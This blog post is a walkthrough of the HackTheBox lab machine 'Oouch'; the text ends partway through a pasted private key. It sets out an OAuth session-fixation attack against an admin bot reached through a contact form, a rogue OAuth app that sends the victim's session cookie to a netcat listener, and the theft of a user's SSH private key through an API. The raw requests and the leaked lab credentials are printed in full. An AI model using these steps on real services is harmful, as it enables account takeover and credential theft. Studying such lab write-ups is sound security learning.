---
layout: post
title: "Oouch "
lang: en
categories:
  - writeups
tags:
  - security
  - writeups
  - linux
  - recon
  - network
  - pe
  - exploit
  - htb
date: 2020/07/31
thumbnail: /img/HackTheBox/oouch.png

toc: true
---
## 💢 Info 

#

- **Name:** Oouch
- **Profile:** [www.hackthebox.eu](https://www.hackthebox.eu/home/machines/profile/231)
- **Difficulty:** Hard
- **OS:** Linux
- **Points:** 40

![oouch](/img/HackTheBox/oouch.png)

#

### Overview

**TL;DR**: The 1st part is a lot about oAuth and the pe part about DBus and UWSGI.

Install tools used in this WU on BlackArch Linux:

```
$ sudo pacman -S nmap filezilla ffuf burpsuite gnu-netcat
```
### Network Enumeration

Let's discover available services with a [nmap][nmap] scan:

```
$ sudo nmap -p- -sSVC 10.10.10.177 -oA nmap_full
[sudo] password for cyfun: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 23:51 CEST
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.10.177
Host is up (0.022s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.102
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=6/29%Time=5EFA626D%P=x86_64-unknown-linux-gnu
SF:%r(GetRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(40
SF:0\)</h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x
SF:20Request\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r
SF:\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authoriz
SF:ation\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/
SF:2\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x2
SF:0Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.42 seconds
```

### FTP Enumeration

Let's check the FTP anonymous access with FileZilla or `ftp` CLI command:

```
$ ftp 10.10.10.177
Connected to 10.10.10.177.
220 qtc's development server
Name (10.10.10.177:cyfun): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
```

Only one file, `project.txt`, we can't miss it:

```
$ cat project.txt
Flask -> Consumer
Django -> Authorization Server
```

It seems we will encounter a python web server in the next steps.

### HTTP Discovery

Then we have a web application on port 5000: http://10.10.10.177:5000/

![](https://i.imgur.com/l2oRua1.png)

There are a login and a register form, so let's register to see what's behind.

![](https://i.imgur.com/fK347aD.png)

We quickly check the menu entries but there is nothing interesting.

The only action we can do is send a message on the contact page.

### HTTP Enumeration

We'll use [ffuf][ffuf] for directory busting:

```
$ ffuf -u http://10.10.10.177:5000/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.177:5000/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

about                   [Status: 200, Size: 1828, Words: 414, Lines: 55]
contact                 [Status: 200, Size: 1828, Words: 414, Lines: 55]
documents               [Status: 200, Size: 1828, Words: 414, Lines: 55]
home                    [Status: 200, Size: 1828, Words: 414, Lines: 55]
logout                  [Status: 200, Size: 1828, Words: 414, Lines: 55]
login                   [Status: 200, Size: 1828, Words: 414, Lines: 55]
oauth                   [Status: 200, Size: 1828, Words: 414, Lines: 55]
profile                 [Status: 200, Size: 1828, Words: 414, Lines: 55]
register                [Status: 200, Size: 2109, Words: 517, Lines: 64]
:: Progress: [4658/4658] :: Job [1/1] :: 388 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

The only endpoint that not linked in the menu is `oauth`.

![](https://i.imgur.com/p3xW5q8.png)

> Please notice: This functionality is currently under development and not ready to be used in production. However, since you know about this hidden URL, it seems that you got developer access and are supposed to use it.
> 
> In order to connect your account with our Oouch authorization server, please visit:
> http://consumer.oouch.htb:5000/oauth/connect
> 
> Once your account is connected, you should be able to use the authorization server for login. Just visit:
> http://consumer.oouch.htb:5000/oauth/login

Before digging deeper the oAuth process I'll add the domain names in `/etc/hosts`
as a domain name may be required:

```
10.10.10.177 oouch.htb
10.10.10.177 consumer.oouch.htb
10.10.10.177 authorization.oouch.htb
```

If we go to http://consumer.oouch.htb:5000/oauth/connect and login we are
redirected several times to end here: http://authorization.oouch.htb:8000/login/

So as we saw in `project.txt`, we must have the following logic:

- Flask -> Consumer -> consumer.oouch.htb:5000
- Django -> Authorization Server -> authorization.oouch.htb:8000

### oAuth Discovery & exploitation

From here I'll have to learn about how oAuth works.

There are plenty resources to explain security flaws in oAuth, we will look how
to perform a _Session Fixation Attack on oAuth_:

- [2020 - SANS (InstituteInformation Security Reading Room) - Four Attacks on OAuth, How to Secure Your OAuthImplementation by Khash Kiani](https://www.sans.org/reading-room/whitepapers/application/attacks-oauth-secure-oauth-implementation-33644)
- [2015 - OWASP (NL Chapter Meeting 2015-01-15) - OAuth by Jim_Manico](https://owasp.org/www-pdf-archive/OWASP-NL_Chapter_Meeting201501015_OAuth_Jim_Manico.pdf)
- [2017 - Attacking the OAuth Protocol by Dhaval Kapil](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/)

So we will have to conduct an attack following those steps (we will need a proxy like [Burp][burp]):

1. The victim (admin) is logged in at consumer site (htpp://consumer.oouch.htb:5000) (The oAuth client application)
2. The attacker (us) register an account at consumer site (http://consumer.oouch.htb:5000/register)
3. The attacker register an account at the provider site (http://authorization.oouch.htb:8000/signup/)
4. The attacker login at the provider site to speed-up the process (http://authorization.oouch.htb:8000/login/)
5. The attacker start login locally at consumer site (http://consumer.oouch.htb:5000/login) 
6. The attacker goes to the oAuth login page (http://consumer.oouch.htb:5000/oauth)
7. The attacker start the connection process:
    1. The attacker send the connect request
        ```
        GET /oauth/connect HTTP/1.1
        Host: consumer.oouch.htb:5000
        ...
        ```
    2. Consumer Site redirects attacker to Provider Site to authorize the consumer site to use the provider site account (the oAuth authorization) (http://authorization.oouch.htb:8000/oauth/authorize/)
        ```
        GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
        Host: authorization.oouch.htb:8000
        ...
        ```
    3. The attacker confirms the authorization by clicking the Authorize button (http://authorization.oouch.htb:8000/oauth/authorize/)
        ```
        POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
        Host: authorization.oouch.htb:8000
        ...

        csrfmiddlewaretoken=VoAxj1ao7mvIrvJDGPCTyB2x6Rq6KEwWWeFwFjEjArMsd2UkWwry6m8hxn737ia2&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
        ```
        ![](https://i.imgur.com/0DNEDdp.png)
    4. The provider site responds with the redirect URL which contains the authorization code in the code parameter (Authorization Grant)
        ```
        GET /oauth/connect/token?code=Srwh8xkKLMf1VDre8HmqGieVQ1aY1C HTTP/1.1
        Host: consumer.oouch.htb:5000
        ...
        ```
    5. Here, the attacker **DOES NOT** follow the redirection (_Drop_ instead of _Forward_ in Burp).
8. Instead the attacker copies the Authorization Grant URL and send it to the administrator via the contact form (pseudo-SSRF that we'll see just after).
    ```
    POST /contact HTTP/1.1
    Host: oouch.htb:5000
    ...

    csrf_token=IjQ0ZTk3YTcxZTJkMTUzMjdkODBmZWJlOTk3MWVhNjFlNDQ3YThkMTIi.XvuH3Q.BYECgUUU9-nRB3hYE9dOPPi_4dA&textfield=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken%3Fcode%3DSrwh8xkKLMf1VDre8HmqGieVQ1aY1C&submit=Send
    ```
9. The victim follows the link and requests the Authorization Grant URL, and by doing so gives authorization to the Attacker to have full authorized access to Victim's account on Consumer Site.
10. The attacker waits a minute and goes back to the oAuth connect URL (http://consumer.oouch.htb:5000/oauth/login) and Authorize.
11. The attacker goes back to the profile page on consumer site and checks the account username is now `qtc`.
    ![](https://i.imgur.com/Fq2UGfd.png)

### SSRF

If you paste an URL in the contact form, someone will click on it (a bot).
So this gives us a pseudo-SSRF (in a phishing way).

![](https://i.imgur.com/fb8jU8m.png)

Here the web server receiving the bot visit 1 minute after the message was sent.

```
$ ruby -run -e httpd share -p 8000
[2020-06-30 19:09:57] INFO  WEBrick 1.6.0
[2020-06-30 19:09:57] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
[2020-06-30 19:09:57] INFO  WEBrick::HTTPServer#start: pid=55191 port=8000
[2020-06-30 19:12:21] ERROR `/' not found.
10.10.10.177 - - [30/Jun/2020:19:12:21 CEST] "GET / HTTP/1.1" 404 273
- -> /
```

So we used this SSRF to send the Authorization Grant URL to the victim.

### qtc's documents

Now that we are logged in as `qtc` (admin) we can access the document endpoint (http://consumer.oouch.htb:5000/documents).


Filename         | Content
-----------------|-----------------------------------------------------------------------------
dev_access.txt   | develop:supermegasecureklarabubu123! -> Allows application registration.
o_auth_notes.txt | /api/get_user -> user data. oauth/authorize -> Now also supports GET method.
todo.txt         | Chris mentioned all users could obtain my ssh key. Must be a joke...

![](https://i.imgur.com/Emawg6x.png)

Knowledge from the documents:

- Credentials to register an app
- There is api to access user data
- The ssh key of `qtc` should be available somewhere

### HTTP Enumeration (again)

There must be an endpoint to register an application as said in `dev_access.txt`.

Let's use [ffuf][ffuf] to find it, rather straightforward:

```
$ ffuf -u http://authorization.oouch.htb:8000/oauth/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://authorization.oouch.htb:8000/oauth/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

applications            [Status: 401, Size: 0, Words: 1, Lines: 1]
:: Progress: [4658/4658] :: Job [1/1] :: 258 req/sec :: Duration: [0:00:18] :: Errors: 0 ::

$ ffuf -u http://authorization.oouch.htb:8000/oauth/applications/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://authorization.oouch.htb:8000/oauth/applications/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

...
register                [Status: 401, Size: 0, Words: 1, Lines: 1]
:: Progress: [4658/4658] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

So we should be able to register an app at http://authorization.oouch.htb:8000/oauth/applications/register

### Registering an app

Go at http://authorization.oouch.htb:8000/oauth/applications/register

We are prompted for credentials (_Oouch Development_):

![](https://i.imgur.com/dbcEKxe.png)

Let's use `dev_access.txt`:

```
develop:supermegasecureklarabubu123! -> Allows application registration.
```

We can now access the registration form:

![](https://i.imgur.com/AlFb2X2.png)

Let's try to register an app.

- Name: cyfunapp
- Client id: ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX
- Client secret: Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs
- Client type: Public
- Authorization grant type: Authorization code
- Redirect uris: http://10.10.15.142:8888/ (attacker machine)

http://authorization.oouch.htb:8000/oauth/applications/2/

![](https://i.imgur.com/hxMb6jf.png)

Let's start a listener:

```
$ nc -nlvp 8888
```

Now reading some [Oracle documentation - Authenticate using OAuth 2.0](https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm)

We know we must request http://authorization.oouch.htb:8000/oauth/authorize endpoint with some well known params.

```
http://authorization.oouch.htb:8000/oauth/authorize?response_type=code&client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&redirect_uri=http://10.10.15.142:8888/&grant_type=authorization_code&client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs
```

Let's try this URL:

![](https://i.imgur.com/KzULlvh.png)

If we confirm the authorization we receive the Authorization Grant URL like earlier.

```
$ nc -nlvp 8888
Connection from 10.10.15.142:41502
GET /?code=68fq0Y8Anbh0Elid3ERKvrb9UCzsbO HTTP/1.1
Host: 10.10.15.142:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?response_type=code&client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&redirect_uri=http://10.10.15.142:8888/&grant_type=authorization_code&client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs
Connection: close
Upgrade-Insecure-Requests: 1
```

### 2nd oAuth exploitation

Let's go back to the contact page (http://consumer.oouch.htb:5000/contact) and use the pseudo-SSRF to gain qtc access, not to the consumer site but to the provider site this time.

After a few minutes we receive the cookie of qtc:

```
$ nc -nlvp 8888
Connection from 10.10.10.177:55806
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
Host: 10.10.15.142:8888
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e;
```

Let's request http://authorization.oouch.htb:8000/ but with qtc's cookie.

We are now logged in as qtc:

![](https://i.imgur.com/WOeWna9.png)

As listed on the home page there is a token endpoint but it seems not reachable with GET, so let's try a POST (as explained in Oracle oAuth doc anyway). The doc also tells us which params to use.

```
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e; csrftoken=w8Q1tZ5XGQnYIfsjJMNksuQoCg5yYHOtkiWHEK2j8Xsu4ti75whbRr32oLBxC6bZ
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 223

grant_type=client_credentials&client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs```

We receive this error:

```json
{"error": "unauthorized_client"}
```

So let's log as `cyfun2` again, access the app params (http://authorization.oouch.htb:8000/oauth/applications/2/) and change _Authorization Grant Type_ to `client-credentials`.

Now we can spoof qtc cookie again and retry.

This time we obtain a much better answer:

```json
{
  "access_token": "Xkuzgir8C38MeCv2xyq08PFMDF5NwX",
  "expires_in": 600,
  "token_type": "Bearer",
  "scope": "read write"
}
```

### Get qtc SSH key

Let's remember of `o_auth_notes.txt`:

```
/api/get_user -> user data. oauth/authorize -> Now also supports GET method.
```

By using this endpoint we gain nothing:

```
GET /api/get_user/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e
Upgrade-Insecure-Requests: 1
```

```json
{"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}
```

As we heard of a ssh key in `todo.txt`, let's try `get_ssh` instead of `get_user`.

```
GET /api/get_ssh/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e
Upgrade-Insecure-Requests: 1
```

```json
{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
```

So here is the private key of qtc:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve/hfW/V7cmEHTDTJtmk7
LJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9/yK1Ie55KQjgnghNdg
reZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo/O88UnqIqaiJV
ZFDpHJ/u0uQc8zqqdHR1HtVVbXiM3u5M/6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIv
bv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRbl
zeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa/PXloKIqi2jA
tZVbgiVqnS0F+4BxE2T38q//G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKe
VcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2
EAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCi
qmC/HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a/f8itSHueSkI4J4ITXYK3mXg1p03wa
2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLk
HPM6qnR0dR7VVW14jN7uTP+rW94/fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27/Jb87RuPF
q7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAo
VyoGHZ1h7Pteaqw5mU80GIGpse/rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0t
BfuAcRNk9/Kv/xudd4kdRF7j84eI0CARgwnIquVTbN7dLp/oHeQHuNHrCSnlXKT4tbChTu
3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hfl
fa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s/Fn6LoNVCnviOfCMkJcDN4YJteRZjNV
97SL5oW72BLesNu21HXuH1M/GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq/mc
CHdzXjIs9dFzSKd38N/RRVbvz3bBpGfxdUWrXZ85Z/wPLPwIKAa8DZnKqEZU0kbyLhNwPv
XO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC/m/WxSVO6x8zli7mUqpik1VZ3X9HWH9ltz
tESlvBYHGgukRO/OFr7VOd/EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp
